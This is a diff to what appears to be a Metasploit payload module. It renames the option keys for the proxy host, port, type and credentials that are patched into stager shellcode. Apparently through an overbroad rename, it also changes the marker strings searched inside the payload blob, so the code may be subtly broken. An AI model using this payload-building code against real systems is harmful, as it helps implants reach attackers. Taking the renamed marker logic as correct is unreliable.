@@ -82,8 +82,8 @@ module Metasploit3
     p[i, u.length] = u
 
     # patch proxy info
-    proxyhost = datastore['PROXY_HOST'].to_s
-    proxyport = datastore['PROXY_PORT'].to_s || "8080"
+    proxyhost = datastore['PayloadProxyHost'].to_s
+    proxyport = datastore['PayloadProxyPort'].to_s || "8080"
 
     if Rex::Socket.is_ipv6?(proxyhost)
       proxyhost = "[#{proxyhost}]"
@@ -93,7 +93,7 @@ module Metasploit3
     if proxyport == "80"
       proxyinfo = proxyhost
     end
-    if datastore['PROXY_TYPE'].to_s == 'HTTP'
+    if datastore['PayloadProxyType'].to_s == 'HTTP'
       proxyinfo = 'http://' + proxyinfo
     else #socks
       proxyinfo = 'socks=' + proxyinfo
@@ -107,34 +107,34 @@ module Metasploit3
     p[proxyloc-4] = [calloffset].pack('V')[0]
 
     # Authentication credentials have not been specified
-    if datastore['PROXY_USERNAME'].to_s == '' or
-       datastore['PROXY_PASSWORD'].to_s == '' or
-       datastore['PROXY_TYPE'].to_s     == 'SOCKS'
+    if datastore['PayloadProxyUser'].to_s == '' or
+       datastore['PayloadProxyPass'].to_s == '' or
+       datastore['PayloadProxyType'].to_s     == 'SOCKS'
 
       jmp_offset = p.index("PROXY_AUTH_STOP") + 15 - p.index("PROXY_AUTH_START")
 
       # Remove the authentication code
       p = p.gsub(/PROXY_AUTH_START(.)*PROXY_AUTH_STOP/i, "")
     else
-      username_size_diff = 14 - datastore['PROXY_USERNAME'].to_s.length
-      password_size_diff = 14 - datastore['PROXY_PASSWORD'].to_s.length
+      username_size_diff = 14 - datastore['PayloadProxyUser'].to_s.length
+      password_size_diff = 14 - datastore['PayloadProxyPass'].to_s.length
       jmp_offset =
         16 + # PROXY_AUTH_START length
         15 + # PROXY_AUTH_STOP length
-        username_size_diff + # Difference between datastore PROXY_USERNAME length  and db "PROXY_USERNAME length"
-        password_size_diff   # Same with PROXY_PASSWORD
+        username_size_diff + # Difference between datastore PayloadProxyUser length  and db "PayloadProxyUser length"
+        password_size_diff   # Same with PayloadProxyPass
 
       # Patch call offset
-      username_loc = p.index("PROXY_USERNAME")
+      username_loc = p.index("PayloadProxyUser")
       p[username_loc - 4, 4] = [15 - username_size_diff].pack("V")
-      password_loc = p.index("PROXY_PASSWORD")
+      password_loc = p.index("PayloadProxyPass")
       p[password_loc - 4, 4] = [15 - password_size_diff].pack("V")
 
       # Remove markers & change login/password
       p = p.gsub("PROXY_AUTH_START","")
       p = p.gsub("PROXY_AUTH_STOP","")
-      p = p.gsub("PROXY_USERNAME", datastore['PROXY_USERNAME'].to_s)
-      p = p.gsub("PROXY_PASSWORD", datastore['PROXY_PASSWORD'].to_s)
+      p = p.gsub("PayloadProxyUser", datastore['PayloadProxyUser'].to_s)
+      p = p.gsub("PayloadProxyPass", datastore['PayloadProxyPass'].to_s)
     end
 
     # Patch jmp dbl_get_server_host
